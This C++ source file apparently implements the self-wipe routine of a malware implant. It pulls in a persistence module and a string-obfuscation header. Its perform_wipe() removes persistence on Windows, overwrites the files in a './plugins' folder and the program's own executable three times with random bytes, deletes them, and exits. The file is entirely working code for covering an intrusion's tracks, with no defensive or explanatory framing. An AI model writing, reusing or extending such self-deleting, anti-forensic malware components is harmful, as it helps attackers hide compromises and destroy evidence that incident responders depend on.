#include "Wipe.h"
#include "PersistenceModule.h"
#include <filesystem>
#include <fstream>
#include "Obfuscation.h"
#include <random>
#include <iostream>
#ifdef _WIN32
#include <windows.h>
#endif
#ifdef __linux__
#include <unistd.h>
#endif

namespace fs = std::filesystem;

static std::string exec_path() {
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
#else
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
    if(len > 0){
        path[len] = 0;
        return std::string(path);
    }
    return {};
#endif
}

static void secure_delete(const fs::path& p) {
    if(!fs::exists(p)) return;
    std::error_code ec;
    auto size = fs::file_size(p, ec);
    std::fstream f(p, std::ios::in | std::ios::out | std::ios::binary);
    std::random_device rd;
    for(int pass=0; pass<3 && f.is_open(); ++pass){
        f.seekp(0);
        for(uintmax_t i=0; i<size; ++i){
            char b = static_cast<char>(rd());
            f.put(b);
        }
        f.flush();
    }
    if(f.is_open()) f.close();
    fs::remove(p, ec);
}

void perform_wipe() {
#ifdef _WIN32
    remove_persistence();
#endif
    for(const auto& entry : fs::directory_iterator(OBFUSCATE("./plugins"))) {
        secure_delete(entry.path());
    }
    secure_delete(exec_path());
    std::cout << "Wipe complete" << std::endl;
    std::exit(0);
}
